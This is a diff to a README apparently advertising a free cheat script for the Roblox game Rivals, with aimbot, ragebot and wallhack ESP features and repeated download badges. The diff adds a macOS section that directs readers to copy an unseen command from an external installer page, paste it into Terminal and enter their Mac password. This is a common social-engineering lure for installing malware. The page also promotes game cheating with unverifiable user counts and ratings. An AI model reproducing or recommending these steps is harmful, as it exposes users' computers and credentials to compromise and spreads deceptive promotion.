@@ -7,7 +7,7 @@
 
 Welcome to the most dominant Rivals Script repository that transforms you from a casual player into an unstoppable force! This comprehensive combat automation suite solves the core challenges Rivals players face: inconsistent aim, impossible reaction times, hidden enemy positions, and the constant frustration of losing fair fights. Whether you're searching for the best rivals script or need a reliable rivals script no key solution, this repository delivers unmatched competitive advantage.
 
-[![Download Now](https://img.shields.io/badge/⬇️-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
+[![Download Now](https://img.shields.io/badge/-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
 
 Our **rivals script no key 2026** package includes revolutionary features like silent aim technology that guarantees perfect accuracy without visible aimbot behavior, ragebot functionality for instantaneous elimination of all visible threats, and comprehensive ESP systems that reveal every enemy position through walls. The integration of silent aim, ragebot, ESP creates a trifecta of competitive superiority that makes winning effortless.
 
@@ -51,7 +51,7 @@ Our development team includes former competitive FPS players who understand exac
 
 Community feedback from over 450,000 users confirms this as the rivals script wall bang alternative available. The combination of powerful combat automation, safety features, cross-platform support, and genuine no-key access creates value that competing scripts cannot match. Whether you're comparing basic aim assistance or advanced ragebot systems, this repository sets the standard for Rivals scripting excellence in 2026.
 
-[![Download Now](https://img.shields.io/badge/⬇️-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
+[![Download Now](https://img.shields.io/badge/-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
 
 ---
 
@@ -74,7 +74,7 @@ Performance analytics reveal improvement opportunities in your natural gameplay.
 
 ## 📥 How to Install
 
-### **PC Installation (Windows/MacOS)**
+### **Windows Installation**
 
 1. Download the Rivals script from the above link
 2. Launch Roblox and join Rivals
@@ -85,10 +85,22 @@ Performance analytics reveal improvement opportunities in your natural gameplay.
 7. Click "Execute" or "Inject" to activate the script
 8. The main GUI appears in the center of your screen
 9. Configure desired features (silent aim, ragebot, ESP, trigger bot)
-10. Press the toggle key (default: RIGHT SHIFT) to show/hide interface
-11. The script begins automated combat assistance immediately
 
-### **Mobile Installation (Android/iOS)**
+[![Download Now](https://img.shields.io/badge/-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
+
+### **macOS Installation**
+
+1. Tap the Download button below to go to the Installer page.  
+2. Copy the command line by clicking the copy button next to it.  
+3. Open Terminal  
+   - Press `Cmd + Space`, type “Terminal”, then hit Enter.  
+4. Paste the command → press Enter.  
+5. Enter your Mac password when asked (that's normal and required for installation).  
+6. 🎉 Done! The command automatically installs, and launch Rivals.app.
+
+[![Download Now](https://img.shields.io/badge/-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
+
+### **Mobile Installation**
 
 1. Download the Rivals script from the above link
 2. Join Rivals on Roblox mobile app
@@ -100,7 +112,7 @@ Performance analytics reveal improvement opportunities in your natural gameplay.
 8. Configure silent aim sensitivity and ESP visibility
 9. The script operates smoothly even on mid-range devices
 
-[![Download Now](https://img.shields.io/badge/⬇️-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
+[![Download Now](https://img.shields.io/badge/-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
 
 ---
 
@@ -122,7 +134,7 @@ Performance analytics reveal improvement opportunities in your natural gameplay.
 
 The rivals script is engineered for minimal resource consumption. The silent aim algorithms use predictive caching to reduce processing overhead, while ESP operates in power-saving mode during inactive periods. Even budget devices maintain smooth 45+ FPS performance with all features enabled.
 
-[![Download Now](https://img.shields.io/badge/⬇️-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
+[![Download Now](https://img.shields.io/badge/-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
 
 ---
 
@@ -168,7 +180,7 @@ Don't struggle with inconsistent aim or lose fights you should win. Join over 45
 
 **Download this rivals script today** and discover why it maintains a 4.87/5 community rating. Remember to follow safety guidelines, customize automation intensity to match your risk tolerance, and stay updated with new releases. The future of effortless Rivals dominance is here—free, powerful, and just one click away!
 
-[![Download Now](https://img.shields.io/badge/⬇️-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
+[![Download Now](https://img.shields.io/badge/-DOWNLOAD_RIVALS_SCRIPT-ff0000.svg?style=for-the-badge&logo=github)](https://rival-script.github.io/rival/)
 
 ---
 
